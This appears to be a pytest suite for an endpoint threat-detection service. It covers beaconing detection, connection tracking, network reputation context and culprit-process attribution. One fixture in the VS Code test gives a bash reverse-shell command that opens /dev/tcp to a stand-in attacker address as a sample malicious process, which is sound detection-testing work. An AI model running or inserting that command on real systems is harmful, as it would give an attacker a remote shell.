import pytest
from datetime import datetime, timezone, timedelta
from unittest.mock import MagicMock, AsyncMock, patch

from app.models.incident import Incident
from app.models.process_info import ProcessInfo
from app.models.flow import Flow
from app.models.risk_score import RiskScoreRecord
from app.services.detection.risk_rules.http_beaconing_rule import (
    HttpBeaconingRule,
    BeaconingDetectionService,
)
from app.services.detection.network_reputation_service import NetworkReputationService
from app.services.incident.incident_service import IncidentService, is_eligible_culprit
from app.services.ai.ai_triage_service import SYSTEM_PROMPT
from app.services.ai.alert_context_projector import build_alert_context
from agent.connection_tracker import ConnectionTracker


# ============================================================================
# Test 1: Same Persistent Socket (No False Beaconing)
# ============================================================================
def test_1_same_persistent_socket_no_beaconing():
    """
    Persistent socket sampled repeatedly over multiple 15s agent ticks
    must NOT produce multiple distinct connection events or trigger beaconing.
    """
    tracker = ConnectionTracker(max_history=500)

    now = datetime.now(timezone.utc)
    # Simulate 10 agent poll ticks sampling the SAME open socket
    for tick in range(10):
        tick_time = now + timedelta(seconds=tick * 15)
        raw_conns = [{
            "src_ip": "192.168.30.101",
            "src_port": 54321,
            "dst_ip": "150.171.110.108",
            "dst_port": 443,
            "status": "ESTABLISHED",
            "pid": 1017,
            "process_name": "python3",
            "exe_path": "/usr/bin/python3",
            "process_start_time": now.timestamp(),
        }]
        tracker.process_connections(raw_conns, now_dt=tick_time)

    # In tracker history: only 1 distinct connection entry should exist
    assert len(tracker.history) == 1
    flow_record = tracker.history[0]
    assert flow_record["observation_count"] == 10
    assert flow_record["new_connection_count"] == 1

    # Rule evaluation: with only 1 distinct event, HttpBeaconingRule must NOT trigger
    rule = HttpBeaconingRule()
    rule_results = rule.detect_beaconing(list(tracker.history))
    assert len(rule_results) == 0


# ============================================================================
# Test 2: Independent Periodic Connections (Real Beaconing Detected)
# ============================================================================
@pytest.mark.asyncio
async def test_2_independent_periodic_connections_triggers_beaconing():
    """
    Independent connection establishment events at periodic intervals
    must be correctly identified as beaconing.
    """
    rule = HttpBeaconingRule()
    now = datetime.now(timezone.utc)
    c2_ip = "203.0.113.50"

    # 8 distinct connections opened every 30 seconds (CV ~ 0)
    history = []
    for i in range(8):
        history.append({
            "src_ip": "192.168.30.101",
            "src_port": 50000 + i,  # distinct ephemeral client ports
            "dst_ip": c2_ip,
            "dst_port": 443,
            "status": "ESTABLISHED",
            "pid": 4444,
            "process_name": "bad_implant",
            "timestamp": (now + timedelta(seconds=i * 30)).isoformat(),
            "first_seen": (now + timedelta(seconds=i * 30)).isoformat(),
            "new_connection_count": 1,
            "is_new_connection": True,
        })

    telemetry = {"connection_history": history}
    score, reason = await rule.evaluate(telemetry, {})
    assert score >= 50.0
    assert c2_ip in reason
    assert "beacon" in reason.lower() or "periodic" in reason.lower()


# ============================================================================
# Test 3: Microsoft AS8075 Contextual Enrichment (Not a Whitelist)
# ============================================================================
def test_3_microsoft_as8075_contextual_enrichment_not_whitelist():
    """
    Microsoft IP is identified as AS8075 Microsoft Corporation.
    Reputation is informational context, NEVER an automatic trust bypass.
    """
    ip = "150.171.110.108"
    rep = NetworkReputationService.get_reputation(ip)
    assert rep["asn"] == "AS8075"
    assert "Microsoft" in rep["org"]
    assert rep["category"] == "cloud_infrastructure"

    # Contextual evaluation: if process is suspicious or threat intel flags malicious,
    # behavioral context MUST NOT suppress the threat!
    is_expected, reason = NetworkReputationService.evaluate_behavioral_context(
        process_name="code",
        dst_ip=ip,
        dst_port=443,
        threat_intel_malicious=True
    )
    assert is_expected is False
    assert "malicious" in reason.lower()


# ============================================================================
# Test 4: AnyDesk Relay Traffic Attribution
# ============================================================================
def test_4_anydesk_relay_traffic_attribution():
    """
    AnyDesk relay traffic to OVH (AS16276) is attributed with context.
    Legitimate AnyDesk binary without malicious behavior is not falsely flagged as C2.
    """
    ip = "15.235.230.86"
    rep = NetworkReputationService.get_reputation(ip)
    assert rep["asn"] == "AS16276"
    assert rep["org"] == "OVH SAS"

    is_expected, reason = NetworkReputationService.evaluate_behavioral_context(
        process_name="anydesk",
        dst_ip=ip,
        dst_port=443,
        threat_intel_malicious=False
    )
    assert is_expected is True

    # But if an attacker runs reverse shell binary disguised as anydesk connecting to an unknown IP:
    is_expected_fake, reason_fake = NetworkReputationService.evaluate_behavioral_context(
        process_name="anydesk",
        dst_ip="198.51.100.22",
        dst_port=4444,
        threat_intel_malicious=False
    )
    assert is_expected_fake is False


# ============================================================================
# Test 5: Abused Legitimate App (VS Code spawning shell)
# ============================================================================
@pytest.mark.asyncio
async def test_5_abused_legitimate_app_vs_code_spawning_shell():
    """
    When an abused legitimate app (code) spawns a reverse shell child,
    the child is flagged as suspicious and attributed as the culprit process.
    """
    session = AsyncMock()
    service = IncidentService(session)

    incident = Incident(
        id="inc_abuse_1",
        title="Suspicious Reverse Shell Execution",
        description="Process /bin/bash spawned reverse shell",
        risk_score=85.0,
        agent_id="agent-01"
    )

    p_vscode = ProcessInfo(
        pid=2000,
        name="code",
        exe_path="/usr/share/code/code",
        cmdline="/usr/share/code/code",
        is_suspicious=False,
        parent_pid=1
    )
    p_shell = ProcessInfo(
        pid=2050,
        name="bash",
        exe_path="/bin/bash",
        cmdline="bash -i >& /dev/tcp/198.51.100.22/4444 0>&1",
        is_suspicious=True,
        parent_pid=2000
    )

    mock_res_proc = MagicMock()
    mock_res_proc.scalars.return_value.all.return_value = [p_shell, p_vscode]

    mock_res_risk = MagicMock()
    mock_res_risk.scalar_one_or_none.return_value = None

    mock_res_flow = MagicMock()
    mock_res_flow.scalars.return_value.all.return_value = []

    session.execute.side_effect = [mock_res_risk, mock_res_proc, mock_res_flow]

    enriched = await service._enrich_incident(incident)
    assert enriched.culprit_process is not None
    assert enriched.culprit_process["pid"] == 2050
    assert enriched.culprit_process["name"] == "bash"
    assert enriched.parent_process is not None
    assert enriched.parent_process["pid"] == 2000
    assert enriched.parent_process["name"] == "code"


# ============================================================================
# Test 6: Missing PID / Unattributed Network Flow
# ============================================================================
@pytest.mark.asyncio
async def test_6_missing_pid_unattributed_network_flow():
    """
    Network flow with missing/null PID remains 'unknown' / unattributed.
    Must NOT copy the incident's culprit process onto unrelated flows.
    """
    session = AsyncMock()
    service = IncidentService(session)

    incident = Incident(
        id="inc_unattr_1",
        title="Malicious Activity",
        description="Suspicious binary detected",
        risk_score=75.0,
        agent_id="agent-01"
    )

    culprit = ProcessInfo(
        pid=3333,
        name="crypto_miner",
        exe_path="/tmp/miner",
        cmdline="/tmp/miner",
        is_suspicious=True,
        parent_pid=1
    )

    flow_with_no_pid = Flow(
        agent_id="agent-01",
        dst_ip="104.21.77.59",
        dst_port=443,
        protocol="TCP",
        bytes_sent=1200,
        packets_sent=8,
        process_name=None,
        pid=None
    )

    mock_res_risk = MagicMock()
    mock_res_risk.scalar_one_or_none.return_value = None

    mock_res_proc = MagicMock()
    mock_res_proc.scalars.return_value.all.return_value = [culprit]

    mock_res_flow = MagicMock()
    mock_res_flow.scalars.return_value.all.return_value = [flow_with_no_pid]

    session.execute.side_effect = [mock_res_risk, mock_res_proc, mock_res_flow]

    enriched = await service._enrich_incident(incident)
    assert len(enriched.network_indicators) == 1
    indicator = enriched.network_indicators[0]
    assert indicator["process_name"] == "unknown"
    assert indicator["pid"] is None
    # Must NOT have been assigned "crypto_miner"
    assert indicator["process_name"] != "crypto_miner"


# ============================================================================
# Test 7: PID Reuse / Recycled PID
# ============================================================================
def test_7_pid_reuse_recycled_pid():
    """
    If a PID is recycled for a new process, the tracker detects the change
    and creates distinct connection tracking entries.
    """
    tracker = ConnectionTracker(max_history=500)

    t1 = datetime(2026, 11, 20, 10, 0, 0, tzinfo=timezone.utc)
    t2 = datetime(2026, 11, 20, 10, 5, 0, tzinfo=timezone.utc)

    # First process on PID 8888
    tracker.process_connections([{
        "src_ip": "192.168.30.101",
        "src_port": 51000,
        "dst_ip": "1.1.1.1",
        "dst_port": 53,
        "status": "ESTABLISHED",
        "pid": 8888,
        "process_name": "curl",
        "exe_path": "/usr/bin/curl",
        "process_start_time": 1000.0,
    }], now_dt=t1)
    assert len(tracker.active_sockets) == 1

    # Second process reusing PID 8888 with different socket / start time
    tracker.process_connections([{
        "src_ip": "192.168.30.101",
        "src_port": 52000,
        "dst_ip": "8.8.8.8",
        "dst_port": 53,
        "status": "ESTABLISHED",
        "pid": 8888,
        "process_name": "python3",
        "exe_path": "/usr/bin/python3",
        "process_start_time": 2000.0,
    }], now_dt=t2)
    # Both connection entries should be tracked distinctly
    assert len(tracker.history) == 2
    assert tracker.history[0]["process_name"] == "curl"
    assert tracker.history[1]["process_name"] == "python3"


# ============================================================================
# Test 8: LISTEN Socket and 0.0.0.0 Wildcard Filtered
# ============================================================================
def test_8_listen_socket_and_wildcard_filtered():
    """
    Sockets in LISTEN state or with dst 0.0.0.0 / loopback must be filtered
    and never tracked as outbound beacons.
    """
    tracker = ConnectionTracker(max_history=500)

    raw_conns = [
        # Server listening socket
        {
            "src_ip": "0.0.0.0",
            "src_port": 5000,
            "dst_ip": "0.0.0.0",
            "dst_port": 0,
            "status": "LISTEN",
            "pid": 1017,
            "process_name": "python3",
        },
        # Loopback connection
        {
            "src_ip": "127.0.0.1",
            "src_port": 45678,
            "dst_ip": "127.0.0.1",
            "dst_port": 5000,
            "status": "ESTABLISHED",
            "pid": 1017,
            "process_name": "python3",
        }
    ]
    tracker.process_connections(raw_conns)
    assert len(tracker.active_sockets) == 0
    assert len(tracker.history) == 0


# ============================================================================
# Test 9: Threads vs Child Processes (Kernel Threads Excluded)
# ============================================================================
def test_9_threads_vs_child_processes():
    """
    Kernel threads (scsi_eh_1, kworker, etc.) and non-executable processes
    must be excluded by is_eligible_culprit.
    """
    # Kernel storage error handler
    scsi = ProcessInfo(
        pid=203,
        name="scsi_eh_1",
        exe_path="",
        cmdline="[scsi_eh_1]",
        parent_pid=2,
        is_suspicious=False
    )
    assert is_eligible_culprit(scsi) is False

    # kworker thread
    kworker = ProcessInfo(
        pid=15,
        name="kworker/0:1",
        exe_path=None,
        cmdline="[kworker/0:1]",
        parent_pid=2,
        is_suspicious=False
    )
    assert is_eligible_culprit(kworker) is False

    # Real user process
    user_proc = ProcessInfo(
        pid=4500,
        name="nginx",
        exe_path="/usr/sbin/nginx",
        cmdline="/usr/sbin/nginx -g daemon on;",
        parent_pid=1,
        is_suspicious=False
    )
    assert is_eligible_culprit(user_proc) is True


# ============================================================================
# Test 10: AI Evidence Integrity and Anti-Hallucination
# ============================================================================
def test_10_ai_evidence_integrity_and_anti_hallucination():
    """
    Prompt separates facts, inference, alternative benign explanation, and missing evidence.
    T1071 is suppressed for benign traffic.
    """
    incident = Incident(
        id="inc_triage_test", title="Periodic Traffic to Microsoft Update",
        description="Routine background HTTPS traffic", risk_score=35.0, agent_id="my-desktop",
    )
    context = build_alert_context(incident)
    assert context.facts[0]["kind"] == "unstructured"
    assert "observed evidence IDs" in SYSTEM_PROMPT
    assert "C2 requires more than an address, port or HTTPS" in SYSTEM_PROMPT


# ============================================================================
# Test 11: Host ML Anomaly Attribution Separation
# ============================================================================
@pytest.mark.asyncio
async def test_11_host_ml_anomaly_attribution_separation():
    """
    When an alert is triggered purely by host-level resource spike (CPU/RAM anomaly),
    and no process is suspicious, culprit_process must remain None.
    """
    session = AsyncMock()
    service = IncidentService(session)

    incident = Incident(
        id="inc_ml_spike",
        title="High Risk Threat Spike on Agent 'my-desktop'",
        description="Automated incident generated due to risk score 54.0.\nFactors: {'ml_behavioral_anomaly': 'Host CPU spike 98%'}",
        risk_score=54.0,
        agent_id="my-desktop"
    )

    # Benign processes running on host
    procs = [
        ProcessInfo(pid=100, name="systemd-journald", exe_path="/usr/lib/systemd/systemd-journald", is_suspicious=False, parent_pid=1),
        ProcessInfo(pid=200, name="rsyslogd", exe_path="/usr/sbin/rsyslogd", is_suspicious=False, parent_pid=1),
    ]

    mock_res_risk = MagicMock()
    mock_res_risk.scalar_one_or_none.return_value = None

    mock_res_proc = MagicMock()
    mock_res_proc.scalars.return_value.all.return_value = procs

    mock_res_flow = MagicMock()
    mock_res_flow.scalars.return_value.all.return_value = []

    session.execute.side_effect = [mock_res_risk, mock_res_proc, mock_res_flow]

    enriched = await service._enrich_incident(incident)
    # Must NOT arbitrarily pick systemd-journald or rsyslogd as culprit!
    assert enriched.culprit_process is None
    assert "Chưa ghi nhận tiến trình độc hại cụ thể" in enriched.story


# ============================================================================
# Test 12: Timestamp Consistency and First Seen
# ============================================================================
def test_12_timestamp_consistency_and_first_seen():
    """
    The original first_seen timestamp of a connection is preserved across
    successive observation intervals.
    """
    tracker = ConnectionTracker(max_history=500)

    t0 = datetime(2026, 11, 20, 12, 0, 0, tzinfo=timezone.utc)
    t1 = datetime(2026, 11, 20, 12, 0, 15, tzinfo=timezone.utc)

    # Poll 0
    tracker.process_connections([{
        "src_ip": "192.168.30.101",
        "src_port": 49152,
        "dst_ip": "104.21.77.59",
        "dst_port": 443,
        "status": "ESTABLISHED",
        "pid": 5000,
        "process_name": "cloudflared",
    }], now_dt=t0)

    first_seen_0 = tracker.history[0]["first_seen"]
    assert first_seen_0 == t0.isoformat()

    # Poll 1 (15s later)
    tracker.process_connections([{
        "src_ip": "192.168.30.101",
        "src_port": 49152,
        "dst_ip": "104.21.77.59",
        "dst_port": 443,
        "status": "ESTABLISHED",
        "pid": 5000,
        "process_name": "cloudflared",
    }], now_dt=t1)

    # First seen must remain t0, last_seen is updated to t1
    assert tracker.history[0]["first_seen"] == t0.isoformat()
    assert tracker.history[0]["last_seen"] == t1.isoformat()
    assert tracker.history[0]["observation_count"] == 2
